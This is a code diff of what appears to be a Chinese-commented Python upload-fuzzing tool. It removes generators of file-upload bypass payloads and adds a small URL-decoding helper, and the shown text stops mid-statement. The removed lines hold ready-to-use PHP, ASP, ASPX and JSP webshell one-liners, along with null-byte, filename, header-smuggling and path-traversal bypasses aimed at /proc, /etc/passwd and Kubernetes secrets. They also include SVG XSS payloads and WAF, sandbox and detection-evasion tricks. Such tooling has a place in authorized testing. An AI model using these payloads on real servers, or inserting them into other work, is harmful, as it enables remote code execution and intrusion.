-            # 添加多个Content-Type头
-            if 'Content-Type:' in TEMP_TEMPLATE_SUFFIX:
-                TEMP_TEMPLATE_HEADER = TEMP_TEMPLATE_SUFFIX
-                header_smuggling_payload.append(TEMP_TEMPLATE_HEADER.replace('Content-Type:', 
-                                                                      'Content-Type: application/x-www-form-urlencoded\r\nContent-Type:'))
-            
-            # 头部折叠攻击
-            if 'Content-Disposition:' in TEMP_TEMPLATE_SUFFIX:
-                TEMP_TEMPLATE_FOLDING = TEMP_TEMPLATE_SUFFIX
-                folded_content = TEMP_TEMPLATE_FOLDING.replace('Content-Disposition:', 'Content-Disposition:\r\n ')
-                header_smuggling_payload.append(folded_content)
-            
-            # 特殊分隔符
-            if 'Content-Disposition:' in TEMP_TEMPLATE_SUFFIX:
-                TEMP_TEMPLATE_SEPARATOR = TEMP_TEMPLATE_SUFFIX
-                for separator in ['\t', '\v', '\f']:
-                    header_smuggling_payload.append(TEMP_TEMPLATE_SEPARATOR.replace(': ', ':' + separator))
-        
-        return header_smuggling_payload
-
-    def null_byte_variations_Fuzz():
-        # 空字节变种攻击 - 简化版
-        null_byte_payload = []
-        Suffix = ['php', 'asp']  # 减少测试的后缀
-        
-        # 最常见的几种空字节表示
-        null_chars = [
-            '%00', '\\0', '\\x00', # 常用空字节表示
-        ]
-        
-        for each_suffix in Suffix:
-            TEMP_TEMPLATE = TEMPLATE
-            TEMP_TEMPLATE_SUFFIX = TEMP_TEMPLATE.replace(filename_suffix, each_suffix)
-            filename_total = re.search('(filename=".*")', TEMP_TEMPLATE_SUFFIX).group(1)
-            
-            for null_char in null_chars:
-                null_byte_payload.append(TEMP_TEMPLATE_SUFFIX.replace(filename_total, 
-                                                                   'filename="zc.{}{}jpg"'.format(each_suffix, null_char)))
-        
-        return null_byte_payload
-
-    def protocol_handler_Fuzz():
-        # 自定义协议处理器利用 - 简化版
-        protocol_payload = []
-        Suffix = ['php']  # 只对PHP使用，因为大多数协议处理器是PHP特有的
-        
-        # 最常用的几种协议
-        protocols = [
-            'phar://', 'zip://', 'php://', 'file://'
-        ]
-        
-        for each_suffix in Suffix:
-            TEMP_TEMPLATE = TEMPLATE
-            TEMP_TEMPLATE_SUFFIX = TEMP_TEMPLATE.replace(filename_suffix, each_suffix)
-            filename_total = re.search('(filename=".*")', TEMP_TEMPLATE_SUFFIX).group(1)
-            
-            for protocol in protocols:
-                protocol_payload.append(TEMP_TEMPLATE_SUFFIX.replace(filename_total, 
-                                                              'filename="{}zc.{}"'.format(protocol, each_suffix)))
-        
-        return protocol_payload
-
-    def svg_xss_Fuzz():
-        # SVG+XSS组合攻击
-        svg_xss_payload = []
-        
-        TEMP_TEMPLATE = TEMPLATE
-        TEMP_TEMPLATE_SVG = TEMP_TEMPLATE.replace(filename_suffix, 'svg')
-        
-        if 'Content-Type:' in TEMP_TEMPLATE_SVG:
-            content_type_line = re.search(r'Content-Type:.*', TEMP_TEMPLATE_SVG).group(0)
-            
-            # 基本SVG XSS载荷
-            svg_payloads = [
-                '<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>',
-                '<svg xmlns="http://www.w3.org/2000/svg"><use href="data:image/svg+xml;base64,PHN2ZyBpZD0idGVzdCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj48c2NyaXB0PmFsZXJ0KDEpPC9zY3JpcHQ+PC9zdmc+#test" /></svg>',
-                '<svg xmlns="http://www.w3.org/2000/svg"><a xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="javascript:alert(1)"><rect width="100" height="100" /></a></svg>'
-            ]
-            
-            for payload in svg_payloads:
-                svg_xss_payload.append(TEMP_TEMPLATE_SVG.replace(content_type_line, 
-                                                              content_type_line + '\r\n' + payload))
-        
-        return svg_xss_payload
-
-    def webdav_method_Fuzz():
-        # WebDAV方法滥用
-        webdav_payload = []
-        Suffix = ['php', 'asp', 'aspx', 'jsp']
-        
-        for each_suffix in Suffix:
-            TEMP_TEMPLATE = TEMPLATE
-            TEMP_TEMPLATE_SUFFIX = TEMP_TEMPLATE.replace(filename_suffix, each_suffix)
-            
-            # 添加WebDAV相关头部和方法
-            TEMP_TEMPLATE_WEBDAV = TEMP_TEMPLATE_SUFFIX
-            webdav_headers = 'Destination: file:///var/www/html/evil.{}\r\nOverwrite: T\r\n'.format(each_suffix)
-            
-            if 'Content-Type:' in TEMP_TEMPLATE_WEBDAV:
-                webdav_payload.append(TEMP_TEMPLATE_WEBDAV.replace('Content-Type:', 
-                                                                 webdav_headers + 'Content-Type:'))
-        
-        return webdav_payload
-
-    def file_content_bypass_Fuzz():
-        # 文件内容检测绕过
-        content_bypass_payload = []
-        
-        # 获取HTTP请求中的原始文件内容部分
-        original_content_match = re.search(r'Content-Type:.*?\r\n\r\n(.*?)(?:\r\n-{10,})', TEMPLATE, re.DOTALL)
-        original_content = ""
-        if original_content_match:
-            original_content = original_content_match.group(1)
-            # 找到包含原始内容的请求部分
-            content_part = original_content_match.group(0)
+def safe_url_decode(encoded_str):
+    """
+    Safely decode URL-encoded string without external dependencies.
+    
+    Args:
+        encoded_str: URL-encoded string (e.g., '%00', '%20')
+    
+    Returns:
+        Decoded string
+    """
+    result = []
+    i = 0
+    while i < len(encoded_str):
+        if encoded_str[i] == '%' and i + 2 < len(encoded_str):
+            try:
+                hex_val = encoded_str[i+1:i+3]
+                result.append(chr(int(hex_val, 16)))
+                i += 3
+            except ValueError:
+                result.append(encoded_str[i])
+                i += 1
         else:
-            # 如果找不到内容部分，就使用普通方式
-            content_part = None
-        
-        # PHP WebShell内容变种
-        php_contents = [
-            '<?php eval($_POST["cmd"]); ?>',
-            '<?php system($_REQUEST["cmd"]); ?>',
-            '<?= `$_GET[0]`; ?>',  # 短标签语法
-            '<?php $_GET[a](base64_decode($_GET[b])); ?>',  # 动态函数调用
-            '<?php $a=chr(97).chr(115).chr(115).chr(101).chr(114).chr(116);$a($_POST[x]); ?>',  # 字符拼接绕过
-            '<?php include $_GET["file"]; ?>',  # 文件包含
-            '<?php preg_replace("/.*/e",base64_decode($_POST["x"]),""); ?>',  # preg_replace代码执行
-            '<?php $_="{"; $_=($_^"<").($_^">;").($_^"/"); ?><?php ${$_}[_]($_POST[x]);?>',  # 无字母数字WebShell
-            '<script language="php">eval($_POST["cmd"]);</script>'  # 使用script标签
-        ]
-        
-        # ASP WebShell内容变种
-        asp_contents = [
-            '<%eval request("cmd")%>',  # 基本ASP WebShell
-            '<%execute request("cmd")%>',  # 使用execute函数
-            '<%response.write CreateObject("WScript.Shell").exec(request("cmd")).StdOut.ReadAll()%>',  # WScript.Shell
-            '<%execute(request("cmd"))%>',  # 另一种写法
-            '<%eval(Replace(chr(112)+chr(97)+chr(115)+chr(115),chr(112)+chr(97)+chr(115)+chr(115),request("cmd")))%>'  # 字符拼接
-        ]
-        
-        # ASPX WebShell内容变种
-        aspx_contents = [
-            '<%@ Page Language="C#" %><%System.Diagnostics.Process.Start("cmd.exe","/c "+Request["cmd"]);%>',
-            '<%@ Page Language="C#" %><%eval(Request.Item["cmd"]);%>',
-            '<%@ Page Language="C#" %><% System.IO.StreamWriter sw=new System.IO.StreamWriter(Request.Form["f"]);sw.Write(Request.Form["c"]);sw.Close(); %>',
-            '<%@ Page Language="Jscript"%><%eval(Request.Item["cmd"],"unsafe");%>'
-        ]
-        
-        # JSP WebShell内容变种
-        jsp_contents = [
-            '<%Runtime.getRuntime().exec(request.getParameter("cmd"));%>',
-            '<%=Runtime.getRuntime().exec(request.getParameter("cmd"))%>',
-            '<% out.println("Output: " + request.getParameter("cmd")); %>',
-            '<%! public void jspInit(){ try{ java.lang.Runtime.getRuntime().exec(request.getParameter("cmd")); }catch(Exception e){} } %>'
-        ]
-        
-        # WAF绕过混淆技术
-        waf_evasion_prefixes = [
-            'GIF89a;\n',  # GIF文件头
-            '#!MIME type image/gif\n',  # MIME类型注释
-            '<!--\n', # HTML注释
-            ';base64,\n',  # 伪装为Data URI
-            'BM\n',  # BMP文件头
-            '%PDF-1.5\n',  # PDF文件头
-            'ID3\n'  # MP3文件头
-        ]
-        
-        # 针对不同文件类型应用不同内容
-        content_types = {
-            'php': php_contents,
-            'asp': asp_contents,
-            'aspx': aspx_contents,
-            'jsp': jsp_contents
-        }
-        
-        for ext, contents in content_types.items():
-            TEMP_TEMPLATE = TEMPLATE
-            TEMP_TEMPLATE_SUFFIX = TEMP_TEMPLATE.replace(filename_suffix, ext)
-            
-            # 针对每种内容变体
-            for content in contents[:2]:  # 限制每种类型使用2个变体
-                if content_part and original_content:
-                    # 替换原始内容而非附加 - 这是关键修改
-                    new_content = content_part.replace(original_content, content)
-                    content_bypass_payload.append(TEMP_TEMPLATE_SUFFIX.replace(content_part, new_content))
-                    
-                    # 添加WAF绕过前缀 - 现在替换原始内容
-                    for prefix in waf_evasion_prefixes[:3]:
-                        new_content_with_prefix = content_part.replace(original_content, prefix + content)
-                        content_bypass_payload.append(TEMP_TEMPLATE_SUFFIX.replace(content_part, new_content_with_prefix))
-                    
-                    # 尝试添加注释和换行绕过 - 也是替换原始内容
-                    if ext == 'php':
-                        new_content_with_comment = content_part.replace(original_content, "/*\n*/\n" + content)
-                        content_bypass_payload.append(TEMP_TEMPLATE_SUFFIX.replace(content_part, new_content_with_comment))
-                        
-                        new_content_with_newline = content_part.replace(original_content, content.replace("<?php", "<?php\n"))
-                        content_bypass_payload.append(TEMP_TEMPLATE_SUFFIX.replace(content_part, new_content_with_newline))
-                    
-                    # 对于ASP和ASPX的注释绕过 - 替换原始内容
-                    if ext in ['asp', 'aspx']:
-                        new_content_with_comment = content_part.replace(original_content, "<!-- -->" + content)
-                        content_bypass_payload.append(TEMP_TEMPLATE_SUFFIX.replace(content_part, new_content_with_comment))
-                else:
-                    # 如果找不到原始内容，保持原来的附加方式作为备份
-                    content_bypass_payload.append(TEMP_TEMPLATE_SUFFIX + "\r\n\r\n" + content)
-        
-        return content_bypass_payload
+            result.append(encoded_str[i])
+            i += 1
+    return ''.join(result)
 
-    def character_mutation_Fuzz():
-        # 字符变异绕过技术
-        char_mutation_payload = []
-        Suffix = ['php', 'asp', 'aspx', 'jsp']
-        
-        for each_suffix in Suffix:
-            TEMP_TEMPLATE = TEMPLATE
-            TEMP_TEMPLATE_SUFFIX = TEMP_TEMPLATE.replace(filename_suffix, each_suffix)
-            filename_total = re.search('(filename=".*")', TEMP_TEMPLATE_SUFFIX).group(1)
-            
-            # 1. 引号变换技术
-            # 单引号替代双引号
-            single_quote = TEMP_TEMPLATE_SUFFIX.replace('filename="', "filename='").replace('"', "'")
-            char_mutation_payload.append(single_quote)
-            
-            # 无引号方式
-            no_quote = TEMP_TEMPLATE_SUFFIX.replace('filename="', "filename=").replace('"', "")
-            char_mutation_payload.append(no_quote)
-            
-            # 反引号替代
-            back_quote = TEMP_TEMPLATE_SUFFIX.replace('filename="', "filename=`").replace('"', "`")
-            char_mutation_payload.append(back_quote)
-            
-            # 2. 特殊字符混淆
-            # 多个分号
-            multi_semicolon = TEMP_TEMPLATE_SUFFIX.replace('form-data; ', 'form-data;;;; ')
-            char_mutation_payload.append(multi_semicolon)
-            
-            # 多个等号
-            multi_equals = TEMP_TEMPLATE_SUFFIX.replace('filename=', 'filename======')
-            char_mutation_payload.append(multi_equals)
-            
-            # 引号和分号组合 - 更简单的形式
-            quote_semicolon = TEMP_TEMPLATE_SUFFIX.replace('filename="', 'filename=";\";"')
-            char_mutation_payload.append(quote_semicolon)
-            
-            # 3. Content-Disposition值畸形
-            # 变形的form-data
-            malformed_form = TEMP_TEMPLATE_SUFFIX.replace('form-data', 'f\ro\rm-\td\ata')
-            char_mutation_payload.append(malformed_form)
-            
-            # form-data大小写混合
-            mixed_case = TEMP_TEMPLATE_SUFFIX.replace('form-data', 'FoRm-DaTa')
-            char_mutation_payload.append(mixed_case)
-            
-            # 4. 换行符/特殊字符分隔
-            # filename参数中插入换行
-            newline_filename = TEMP_TEMPLATE_SUFFIX.replace('filename="', 'filename="\r\n')
-            char_mutation_payload.append(newline_filename)
-            
-            # Content-Disposition中插入特殊字符
-            special_chars = ['\t', '\v', '\f', '\b']
-            for char in special_chars:
-                special_disp = TEMP_TEMPLATE_SUFFIX.replace('Content-Disposition:', 'Content-Disposition:' + char)
-                char_mutation_payload.append(special_disp)
-                
-                # 参数名与值之间插入特殊字符
-                special_param = TEMP_TEMPLATE_SUFFIX.replace('filename="', 'filename=' + char + '"')
-                char_mutation_payload.append(special_param)
-            
-            # 5. 使用RFC不常见但有效的字符
-            # 使用反斜杠转义
-            backslash_escape = TEMP_TEMPLATE_SUFFIX.replace('filename="', 'filename="\\')
-            char_mutation_payload.append(backslash_escape)
-            
-            # 参数和值之间加入空格变体
-            space_variants = [' ', '  ', ' \t ', ' \r ', ' \n ']
-            for space in space_variants:
-                space_param = TEMP_TEMPLATE_SUFFIX.replace('filename=', 'filename=' + space)
-                char_mutation_payload.append(space_param)
-        
-        return char_mutation_payload
 
-    def data_overflow_Fuzz():
-        # 数据重复与溢出绕过技术
-        overflow_payload = []
-        Suffix = ['php', 'asp', 'aspx', 'jsp']
-        
-        for each_suffix in Suffix:
-            TEMP_TEMPLATE = TEMPLATE
-            TEMP_TEMPLATE_SUFFIX = TEMP_TEMPLATE.replace(filename_suffix, each_suffix)
-            filename_total = re.search('(filename=".*")', TEMP_TEMPLATE_SUFFIX)
-            if not filename_total:
-                continue
-            filename_total = filename_total.group(1)
-            
-            # 1. filename重复定义
-            if 'Content-Disposition:' in TEMP_TEMPLATE_SUFFIX:
-                # 多个filename参数
-                multi_filename_var = [
-                    'filename="shell.jpg"; filename="shell.{}"'.format(each_suffix),  # 双filename定义
-                    'filename="shell.{}" filename="shell.jpg"'.format(each_suffix),   # 无分号多filename
-                    'filename="shell.jpg" filename="shell.txt" filename="shell.{}"'.format(each_suffix),  # 三重filename
-                    'filename="shell.jpg";filename="shell.{}"'.format(each_suffix),   # 无空格双filename
-                    'filename=""; filename="shell.{}"'.format(each_suffix)            # 空filename后跟真实filename
-                ]
-                
-                for variation in multi_filename_var:
-                    overflow_payload.append(TEMP_TEMPLATE_SUFFIX.replace(filename_total, variation))
-            
-            # 2. 数据溢出攻击
-            overflow_var = [
-                'filename="{}{}shell.{}"'.format('A'*128, '.', each_suffix),         # 文件名前缀溢出
-                'filename="shell.{}{}."'.format(each_suffix, 'A'*128),               # 文件名后缀溢出
-                'filename="shell.{}'.format(each_suffix) + '"' + 'A'*256,            # 引号后垃圾数据
-                'filename="shell.' + 'A'*1024 + '.{}"'.format(each_suffix)           # 超长文件名
-            ]
-            
-            for variation in overflow_var:
-                overflow_payload.append(TEMP_TEMPLATE_SUFFIX.replace(filename_total, variation))
-            
-            # 3. 边界溢出攻击
-            if '--' in TEMP_TEMPLATE_SUFFIX and 'Content-Type: ' in TEMP_TEMPLATE_SUFFIX:
-                # 提取boundary字符串
-                boundary_match = re.search(r'--[-A-Za-z0-9]*', TEMP_TEMPLATE_SUFFIX)
-                if boundary_match:
-                    boundary = boundary_match.group(0)
-                    # boundary重复与变体
-                    overflow_payload.append(TEMP_TEMPLATE_SUFFIX.replace(boundary, boundary + '\r\n' + boundary))
-                    overflow_payload.append(TEMP_TEMPLATE_SUFFIX.replace(boundary, boundary + boundary[2:]))
-                    overflow_payload.append(TEMP_TEMPLATE_SUFFIX.replace(boundary, boundary + 'A'*256))
-                    overflow_payload.append(TEMP_TEMPLATE_SUFFIX.replace(boundary, boundary + ';' + 'A'*128))
-            
-            # 4. 高级截断技术
-            truncate_var = [
-                'filename="shell.{}\r\n.jpg"'.format(each_suffix),     # 文件名中回车截断
-                'filename="shell.{}\0.jpg"'.format(each_suffix),       # 空字节截断
-                'filename="shell.{}\t.jpg"'.format(each_suffix),       # 制表符截断
-                'filename="shell.{}\\".jpg"'.format(each_suffix),      # 反斜杠截断
-                'filename="shell.{}'.format(each_suffix)               # 不闭合引号截断
-            ]
-            
-            for variation in truncate_var:
-                overflow_payload.append(TEMP_TEMPLATE_SUFFIX.replace(filename_total, variation))
-        
-        print "Data Overflow & Truncation generated %d payloads" % len(overflow_payload)
-        return overflow_payload
-
-    def advanced_character_mutation_Fuzz():
-        # 高级字符变异技术
-        mutation_payload = []
-        Suffix = ['php', 'asp', 'aspx', 'jsp']
-        
-        for each_suffix in Suffix:
-            TEMP_TEMPLATE = TEMPLATE
-            TEMP_TEMPLATE_SUFFIX = TEMP_TEMPLATE.replace(filename_suffix, each_suffix)
-            filename_total = re.search('(filename=".*")', TEMP_TEMPLATE_SUFFIX)
-            if not filename_total:
-                continue
-            filename_total = filename_total.group(1)
-            
-            # 1. 引号变换
-            # 使用不同的引号组合
-            quote_variations = [
-                'filename=shell.{}'.format(each_suffix),                # 无引号
-                'filename=\'shell.{}\''.format(each_suffix),            # 单引号
-                'filename="shell.{}'.format(each_suffix),               # 前引号
-                'filename=shell.{}"'.format(each_suffix),               # 后引号
-                'filename=\'shell.{}\"'.format(each_suffix),            # 混合引号
-                'filename=""shell.{}"'.format(each_suffix),             # 双引号嵌套
-                'filename=\'\'shell.{}\''.format(each_suffix)           # 单引号嵌套
-            ]
-            
-            for variation in quote_variations:
-                mutation_payload.append(TEMP_TEMPLATE_SUFFIX.replace(filename_total, variation))
-            
-            # 2. 换行符插入
-            # 在字段名和值之间插入换行符
-            newline_variations = [
-                'filename=\nshell.{}'.format(each_suffix),              # 等号后换行
-                'filename\n=shell.{}'.format(each_suffix),              # 等号前换行
-                'filename=shell\n.{}'.format(each_suffix),              # 文件名中换行
-                'filename=shell.\n{}'.format(each_suffix),              # 点后换行
-                'filename\r\n=shell.{}'.format(each_suffix),            # CRLF换行
-                'filename=\r\nshell.{}'.format(each_suffix)             # 等号后CRLF
-            ]
-            
-            for variation in newline_variations:
-                mutation_payload.append(TEMP_TEMPLATE_SUFFIX.replace(filename_total, variation))
-            
-            # 3. 多符号累加
-            # 分号和等号的多重组合
-            symbol_variations = [
-                'filename==shell.{}'.format(each_suffix),               # 双等号
-                'filename===shell.{}'.format(each_suffix),              # 三等号
-                'filename====shell.{}'.format(each_suffix),             # 四等号
-                'filename=;shell.{}'.format(each_suffix),               # 等号后分号
-                'filename=;;;shell.{}'.format(each_suffix),             # 等号后多分号
-                'filename="shell.{}";'.format(each_suffix),             # 引号后分号
-                'filename="shell.{};;;;'.format(each_suffix)            # 多分号结尾
-            ]
-            
-            for variation in symbol_variations:
-                mutation_payload.append(TEMP_TEMPLATE_SUFFIX.replace(filename_total, variation))
-            
-            # 4. Content-Disposition 值变种
-            if 'Content-Disposition: form-data;' in TEMP_TEMPLATE_SUFFIX:
-                cd_variations = [
-                    'Content-Disposition: FoRm-DaTa;',                  # 大小写混合
-                    'Content-Disposition: form-data ;',                 # 多空格
-                    'Content-Disposition:form-data;',                   # 无空格
-                    'Content-Disposition: form-data+;',                 # 加号
-                    'Content-Disposition: form-data-;',                 # 减号
-                    'Content-Disposition: form data;',                  # 无连字符
-                    'Content-Disposition: form_data;',                  # 下划线
-                    'Content-Disposition: formdata;',                   # 无分隔符
-                    'Content-Disposition: form-d4ta;',                  # 数字替换
-                    'Content-Disposition: xform-data;'                  # 前缀干扰
-                ]
-                
-                for variation in cd_variations:
-                    mutation_payload.append(TEMP_TEMPLATE_SUFFIX.replace('Content-Disposition: form-data;', variation))
-        
-        print "Advanced Character Mutation generated %d payloads" % len(mutation_payload)
-        return mutation_payload
-
-    def cloud_environment_bypass_Fuzz():
-        # 云环境特定绕过技术
-        cloud_payload = []
-        Suffix = ['php', 'asp', 'aspx', 'jsp']
-        
-        for each_suffix in Suffix:
-            TEMP_TEMPLATE = TEMPLATE
-            TEMP_TEMPLATE_SUFFIX = TEMP_TEMPLATE.replace(filename_suffix, each_suffix)
-            
-            filename_total = re.search('(filename=".*")', TEMP_TEMPLATE_SUFFIX)
-            if not filename_total:
-                continue
-            filename_total = filename_total.group(1)
-            
-            # 1. 对象存储元数据攻击
-            # AWS S3/Azure Blob存储相关绕过
-            s3_metadata_headers = [
-                'x-amz-meta-filetype: text/html\r\n',
-                'x-amz-meta-original-filename: original.{}\r\n'.format(each_suffix),
-                'x-amz-website-redirect-location: /evil.{}\r\n'.format(each_suffix),
-                'x-ms-meta-resourcetype: Microsoft.Compute/virtualMachines/extensions\r\n',
-                'x-ms-blob-content-type: text/html\r\n'
-            ]
-            
-            for header in s3_metadata_headers:
-                if 'Content-Type:' in TEMP_TEMPLATE_SUFFIX:
-                    cloud_payload.append(TEMP_TEMPLATE_SUFFIX.replace('Content-Type:', header + 'Content-Type:'))
-            
-            # 2. 容器化环境路径遍历
-            container_paths = [
-                'filename="/proc/self/root/var/www/html/shell.{}"'.format(each_suffix),
-                'filename="/proc/self/cwd/shell.{}"'.format(each_suffix),
-                'filename="/proc/self/environ/shell.{}"'.format(each_suffix),
-                'filename="../../../etc/passwd/shell.{}"'.format(each_suffix),
-                'filename="../../../../var/www/html/shell.{}"'.format(each_suffix)
-            ]
-            
-            for path in container_paths:
-                cloud_payload.append(TEMP_TEMPLATE_SUFFIX.replace(filename_total, path))
-            
-            # 3. Kubernetes/Docker环境特殊路径
-            k8s_paths = [
-                'filename="/var/run/secrets/kubernetes.io/shell.{}"'.format(each_suffix),
-                'filename="/var/run/docker.sock/shell.{}"'.format(each_suffix),
-                'filename=".dockerenv/shell.{}"'.format(each_suffix),
-                'filename="/tmp/shell.{}"'.format(each_suffix),
-                'filename="/dev/shm/shell.{}"'.format(each_suffix)
-            ]
-            
-            for path in k8s_paths:
-                cloud_payload.append(TEMP_TEMPLATE_SUFFIX.replace(filename_total, path))
-            
-            # 4. 云函数临时存储利用
-            if 'Content-Disposition:' in TEMP_TEMPLATE_SUFFIX:
-                cloud_payload.append(TEMP_TEMPLATE_SUFFIX.replace('Content-Disposition:',
-                                                               'X-Function-Storage: /tmp\r\nContent-Disposition:'))
-                cloud_payload.append(TEMP_TEMPLATE_SUFFIX.replace('Content-Disposition:',
-                                                               'X-Lambda-Tmp-Dir: /tmp\r\nContent-Disposition:'))
-            
-        print "Cloud Environment Bypass generated %d payloads" % len(cloud_payload)
-        return cloud_payload
-
-    def advanced_defense_evasion_Fuzz():
-        # 高级防御绕过技术 - 针对AI和行为分析防御系统
-        defense_payload = []
-        Suffix = ['php', 'asp', 'aspx', 'jsp']
-        
-        for each_suffix in Suffix:
-            TEMP_TEMPLATE = TEMPLATE
-            TEMP_TEMPLATE_SUFFIX = TEMP_TEMPLATE.replace(filename_suffix, each_suffix)
-            
-            filename_total = re.search('(filename=".*")', TEMP_TEMPLATE_SUFFIX)
-            if not filename_total:
-                continue
-            filename_total = filename_total.group(1)
-            
-            # 1. AI模型绕过 - 混淆和逃逸技术
-            ai_evasion_filenames = [
-                # 语义扰动技术 (针对基于语义的模型)
-                'filename="innocent_image.{}.jpg"'.format(each_suffix),
-                'filename="profile_picture.{}"'.format(each_suffix),
-                'filename="harmless_doc.{}.txt"'.format(each_suffix),
-                'filename="backup.{}.dat"'.format(each_suffix),
-                'filename="normal_file.{}bin"'.format(each_suffix),
-                'filename="document_{}_v1.0.txt"'.format(each_suffix),
-                'filename="personal_data_{}_backup.cfg"'.format(each_suffix),
-                # 神经网络对抗样本技术 (对抗神经网络)
-                'filename="1e\u200Bma\u200Bge.{}"'.format(each_suffix),  # 零宽空格干扰
-                'filename="img\u2060pha\u2060oto.{}"'.format(each_suffix),  # 单词连接器
-                'filename="[system.io.file]::shell.{}"'.format(each_suffix),  # 混淆数据语法
-                'filename="\u180Edocument.\u180E{}"'.format(each_suffix),  # 蒙古文字距离干扰
-                'filename="m\u200Cy\u200C.\u200C{}"'.format(each_suffix)  # 零宽度连字符
-            ]
-            
-            # 新增：对抗样本生成技术
-            ai_adversarial_filenames = [
-                # 对抗性噪声模拟 - 使用特殊文件名模拟对抗样本
-                'filename="adversarial_noise_{}_epsilon0.1.jpg"'.format(each_suffix),
-                'filename="perturbed_image_fgsm_{}.jpg"'.format(each_suffix),
-                'filename="pgd_attack_{}_targeted.jpg"'.format(each_suffix),
-                'filename="carlini_wagner_l2_{}.jpg"'.format(each_suffix),
-                # GAN生成的混合文件模拟
-                'filename="gan_generated_{}_normalized.jpg"'.format(each_suffix),
-                'filename="stylegan2_{}_mixed.jpg"'.format(each_suffix),
-                'filename="cyclegan_real2shell_{}.jpg"'.format(each_suffix)
-            ]
-            
-            for filename in ai_evasion_filenames:
-                defense_payload.append(TEMP_TEMPLATE_SUFFIX.replace(filename_total, filename))
-            
-            for filename in ai_adversarial_filenames:
-                defense_payload.append(TEMP_TEMPLATE_SUFFIX.replace(filename_total, filename))
-                
-            # 添加对抗性噪声内容和GAN混合文件内容
-            if 'Content-Type:' in TEMP_TEMPLATE_SUFFIX:
-                content_type_line = re.search(r'Content-Type:.*', TEMP_TEMPLATE_SUFFIX).group(0)
-                
-                # 对抗性噪声 - 添加模拟对抗噪声到图像元数据
-                noise_comments = [
-                    '/* FGSM Noise Pattern: ε=0.1, target=benign_class */',
-                    '/* Adversarial Perturbation: L2-norm=0.05, confidence=0.95 */',
-                    '/* PGD Attack: steps=40, step-size=0.01, targeted=false */'
-                ]
-                
-                for comment in noise_comments:
-                    defense_payload.append(TEMP_TEMPLATE_SUFFIX.replace(content_type_line, 
-                                                                      content_type_line + '\r\n' + comment))
-                
-                # GAN生成的混合文件 - 添加模拟GAN标记
-                gan_markers = [
-                    '/* StyleGAN2 latent code: w=[0.2,0.5,-0.3,...], truncation=0.7 */',
-                    '/* CycleGAN translation: source=img.jpg, target_domain=code */',
-                    '/* GAN-based steganography: PSNR=42dB, payload_size=2KB */'
-                ]
-                
-                for marker in gan_markers:
-                    defense_payload.append(TEMP_TEMPLATE_SUFFIX.replace(content_type_line, 
-                                                                      content_type_line + '\r\n' + marker))
-            
-            # 2. 沙箱检测绕过
-            if 'Content-Type:' in TEMP_TEMPLATE_SUFFIX:
-                # 添加延迟执行代码标记 - 使用固定值替代时间函数
-                fixed_time = 1735689600  # 2025年1月1日的时间戳
-                sandbox_headers = [
-                    'X-Sandbox-Delay: 60\r\n',
-                    'X-Execution-After: {}\r\n'.format(fixed_time),
-                    'X-Sandboxed: false\r\n',
-                    'X-Environment-Check: prod\r\n',
-                    'X-Analysis-Skip: true\r\n',
-                    'X-Security-Bypass: allowed\r\n',
-                    'X-Scanner-Ignore: 1\r\n',
-                    'X-Antivirus-Status: clean\r\n'
-                ]
-                
-                # 新增: 环境指纹识别技术
-                environment_fingerprint_headers = [
-                    'X-CPU-Check: cores>2\r\n',
-                    'X-Memory-Check: ram>2GB\r\n',
-                    'X-VM-Detection: false\r\n',
-                    'X-Docker-Check: disabled\r\n',
-                    'X-System-Uptime: >3600\r\n',
-                    'X-Process-Count: >50\r\n',
-                    'X-Network-Interfaces: >1\r\n',
-                    'X-Load-Average: <0.1\r\n'
-                ]
-                
-                # 新增: 复杂延时触发机制
-                delayed_execution_headers = [
-                    'X-Execute-After-Idle: 1800\r\n',
-                    'X-Sleep-Random: 3600-7200\r\n',
-                    'X-Execution-Condition: sys_getloadavg<0.1\r\n',
-                    'X-Trigger-On: user_activity\r\n',
-                    'X-Delay-Mechanism: setTimeout(random(3600,7200))\r\n',
-                    'X-Trigger-Pattern: cron_based\r\n'
-                ]
-                
-                for header in sandbox_headers:
-                    defense_payload.append(TEMP_TEMPLATE_SUFFIX.replace('Content-Type:', 
-                                                                     header + 'Content-Type:'))
-                
-                for header in environment_fingerprint_headers:
-                    defense_payload.append(TEMP_TEMPLATE_SUFFIX.replace('Content-Type:', 
-                                                                     header + 'Content-Type:'))
-                    
-                for header in delayed_execution_headers:
-                    defense_payload.append(TEMP_TEMPLATE_SUFFIX.replace('Content-Type:', 
-                                                                     header + 'Content-Type:'))
-                
-                # 新增: 特殊的PHP环境检测代码模拟
-                php_env_checks = [
-                    '/* <?php if(sys_getloadavg()[0]<0.1) { execute_payload(); } ?> */\r\n',
-                    '/* <?php if(php_uname("s")!="Linux") { eval($_POST["cmd"]); } ?> */\r\n',
-                    '/* <?php if(memory_get_usage(true) > 1024*1024*512) { include($_GET["file"]); } ?> */\r\n',
-                    '/* <?php sleep(rand(3600,7200)); system($_REQUEST["cmd"]); ?> */\r\n',
-                    '/* <?php if(getenv("REMOTE_ADDR")!="127.0.0.1") { die(); } ?> */\r\n'
-                ]
-                
-                for check in php_env_checks:
-                    defense_payload.append(TEMP_TEMPLATE_SUFFIX.replace('Content-Type:', 
-                                                                     check + 'Content-Type:'))
-            
-            # 添加更多自定义头信息
-            if 'Content-Disposition:' in TEMP_TEMPLATE_SUFFIX:
-                custom_headers = [
-                    'X-Client-IP: 127.0.0.1\r\n',
-                    'X-Forwarded-For: 192.168.1.1\r\n',
-                    'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\r\n',
-                    'X-Real-IP: 10.0.0.1\r\n',
-                    'X-Originating-IP: [::1]\r\n',
-                    'X-Reverse-Proxy: nginx/1.19.10\r\n',
-                    'X-Waf-Status: bypass\r\n',
-                    'X-Admin-Auth: 1\r\n',
-                    'X-Internal-Request: true\r\n',
-                    'X-Trusted-Domain: local\r\n'
-                ]
-                
-                for header in custom_headers:
-                    defense_payload.append(TEMP_TEMPLATE_SUFFIX.replace('Content-Disposition:', 
-                                                                     header + 'Content-Disposition:'))
-            
-            # 3. 多层编码和加密技术
-            # Base64嵌套编码（基于已有的基础进行增强）
-            if 'Content-Type:' in TEMP_TEMPLATE_SUFFIX:
-                import base64
-                
-                # 双重编码文件名 (对每种文件类型都处理)
-                encoded_name = base64.b64encode('shell.{}'.format(each_suffix))
-                double_encoded = base64.b64encode(encoded_name)
-                defense_payload.append(TEMP_TEMPLATE_SUFFIX.replace(filename_total, 
